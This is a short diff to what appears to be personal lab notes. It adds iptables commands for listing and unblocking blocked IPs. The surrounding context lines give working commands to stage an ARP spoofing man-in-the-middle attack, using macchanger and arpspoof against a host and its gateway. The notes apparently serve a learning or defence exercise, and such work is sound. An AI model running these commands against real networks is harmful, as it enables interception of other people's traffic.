@@ -9,3 +9,8 @@ to create arp spoof attack:
       (i) sudo macchanger -r enp0s3
       (ii) sudo arpspoof -i enp0s3 -t 192.168.1.8 192.168.1.1
   3) terminal 3: sudo arpspoof -i enp0s3 -t 192.168.1.1 192.168.1.8
+
+
+to list all the blocked IPs: sudo iptables -L INPUT -n --line-numbers
+to unblock a certain ip: sudo iptables -D INPUT <index>       (get index from the above list)
+
